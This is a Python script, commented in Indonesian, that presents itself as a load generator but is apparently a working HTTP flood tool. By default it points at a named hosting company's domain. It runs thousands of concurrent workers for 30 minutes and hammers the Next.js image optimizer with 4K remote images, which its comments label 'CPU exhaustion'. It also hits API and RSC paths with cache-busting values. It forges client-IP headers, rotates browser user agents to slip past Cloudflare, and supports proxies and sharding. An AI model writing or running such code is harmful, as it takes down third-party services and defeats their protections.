# load.py — async multi-vector load generator
# python 3.12 | aiohttp | CF + Next.js tuned
# satu runner mampu 3000-5000 koneksi paralel

import asyncio
import os
import random
import signal
import string
import sys
import time
from urllib.parse import urlparse, quote

import aiohttp
from aiohttp import ClientTimeout, TCPConnector

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


# ---- konfigurasi ----
TARGET   = os.environ.get("TARGET", "https://astrixhosting.com").rstrip("/")
DURATION = int(os.environ.get("DURATION", "1800"))
CONC     = int(os.environ.get("CONC", "3000"))
SHARD    = os.environ.get("SHARD", "0")
USE_PROXIES = os.environ.get("USE_PROXIES", "0") == "1"

CONNECT_TIMEOUT = 8.0
TOTAL_TIMEOUT   = 15.0
POOL_SIZE       = 500

IMAGE_SOURCES = [
    "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/"
    "Cat_November_2010-1a.jpg/3840px-Cat_November_2010-1a.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/"
    "Cat03.jpg/3840px-Cat03.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/"
    "Vulpes_vulpes_ssp_fulvus.jpg/3840px-Vulpes_vulpes_ssp_fulvus.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/"
    "Cat_November_2010-1a.jpg/4096px-Cat_November_2010-1a.jpg",
]

API_PATHS = [
    "/api/", "/api/auth/", "/api/v1/", "/api/health",
    "/api/user", "/api/data", "/api/status", "/api/config",
    "/api/search?q=" + "a"*8,
]

RSC_PATHS = ["/?_rsc=", "/index?_rsc=", "/?_rsc=a" ]

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 "
    "Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

ACCEPT_POOL = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/avif,image/webp,image/apng,*/*;q=0.8",
    "application/json,text/plain,*/*",
]

# ---- statistik ----
class Stats:
    def __init__(self):
        self.ok = 0
        self.fail = 0
        self.bytes = 0
        self.s403 = 0
        self.s429 = 0
        self.s5xx = 0
        self.start = time.time()
        self.lock = asyncio.Lock()

    async def record(self, status: int, size: int):
        async with self.lock:
            if 200 <= status < 400:
                self.ok += 1
            else:
                self.fail += 1
            if status == 403:
                self.s403 += 1
            elif status == 429:
                self.s429 += 1
            elif 500 <= status < 600:
                self.s5xx += 1
            self.bytes += size

    def snapshot(self) -> str:
        dt = max(1e-6, time.time() - self.start)
        return (f"[shard {SHARD}] ok={self.ok} fail={self.fail} "
                f"403={self.s403} 429={self.s429} 5xx={self.s5xx} "
                f"rate={self.ok / dt:.0f} req/s bytes={self.bytes}")


STATS = Stats()
STOP = asyncio.Event()


# ---- helper ----
def rand_ip() -> str:
    return (f"{random.randint(1,223)}.{random.randint(0,255)}."
            f"{random.randint(0,255)}.{random.randint(1,254)}")


def build_headers() -> dict:
    return {
        "User-Agent": random.choice(UA_POOL),
        "Accept": random.choice(ACCEPT_POOL),
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache, no-store, max-age=0",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", '
                     '"Not-A.Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "DNT": "1",
        "X-Forwarded-For": rand_ip(),
        "X-Real-IP": rand_ip(),
        "CF-Connecting-IP": rand_ip(),
        "True-Client-IP": rand_ip(),
        "Forwarded": f"for={rand_ip()};proto=https",
    }


def pick_url() -> str:
    r = random.random()
    if r < 0.55:
        # image optimizer — CPU exhaustion, CF dynamic
        src = random.choice(IMAGE_SOURCES)
        w = random.choice([1920, 2560, 3840, 4096])
        q = random.choice([85, 90, 95, 100])
        return (f"{TARGET}/_next/image?url="
                f"{quote(src, safe='')}&w={w}&q={q}")
    elif r < 0.85:
        return TARGET + random.choice(API_PATHS)
    else:
        base = random.choice(RSC_PATHS)
        if base.endswith("="):
            return TARGET + base + "".join(
                random.choices(string.ascii_lowercase + string.digits, k=12))
        return TARGET + base + f"&t={random.randint(1, 10**9)}"


# ---- worker ----
async def worker(session: aiohttp.ClientSession):
    while not STOP.is_set():
        url = pick_url()
        headers = build_headers()
        try:
            async with session.get(url, headers=headers,
                                   allow_redirects=False) as resp:
                # baca body sampe habis biar koneksi reuse
                body = await resp.read()
                await STATS.record(resp.status, len(body))
                # kalo CF challenge, jangan retry langsung
                if resp.status in (403, 429):
                    await asyncio.sleep(random.uniform(0.05, 0.3))
        except asyncio.TimeoutError:
            await STATS.record(0, 0)
        except (aiohttp.ClientError, OSError):
            await STATS.record(0, 0)


# ---- reporter ----
async def reporter():
    last = STATS.snapshot()
    while not STOP.is_set():
        await asyncio.sleep(5)
        line = STATS.snapshot()
        if line != last:
            print(line, flush=True)
            last = line


# ---- main ----
async def main():
    u = urlparse(TARGET)
    print(f"[shard {SHARD}] target={u.netloc} conc={CONC} "
          f"dur={DURATION}s proxies={USE_PROXIES}")

    timeout = ClientTimeout(total=TOTAL_TIMEOUT,
                            connect=CONNECT_TIMEOUT, sock_read=TOTAL_TIMEOUT)

    # connector — proxy atau direct
    if USE_PROXIES and HAS_SOCKS:
        proxies = []
        try:
            with open("proxies.txt") as f:
                proxies = [l.strip() for l in f if l.strip()
                           and not l.startswith("#")]
        except FileNotFoundError:
            print("proxies.txt ga ada, fallback direct")
        if proxies:
            conn = ProxyConnector.from_url(
                random.choice(proxies), limit=POOL_SIZE,
                limit_per_host=POOL_SIZE, ssl=False)
            print(f"[shard {SHARD}] pakai {len(proxies)} proxy")
        else:
            conn = TCPConnector(limit=POOL_SIZE,
                                limit_per_host=POOL_SIZE, ssl=False)
    else:
        conn = TCPConnector(limit=POOL_SIZE,
                            limit_per_host=POOL_SIZE, ssl=False)

    connector_kw = dict(
        connector=conn,
        timeout=timeout,
        headers={"Connection": "keep-alive"},
        auto_decompress=False,
        read_bufsize=64 * 1024,
    )

    async with aiohttp.ClientSession(**connector_kw) as session:
        tasks = [asyncio.create_task(worker(session)) for _ in range(CONC)]
        rep = asyncio.create_task(reporter())

        try:
            await asyncio.sleep(DURATION)
        except (KeyboardInterrupt, asyncio.CancelledError):
            pass
        finally:
            STOP.set()
            rep.cancel()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.gather(rep, return_exceptions=True)

    print(STATS.snapshot(), flush=True)


def _sig_handler(signum, frame):
    STOP.set()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sig_handler)
    signal.signal(signal.SIGTERM, _sig_handler)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
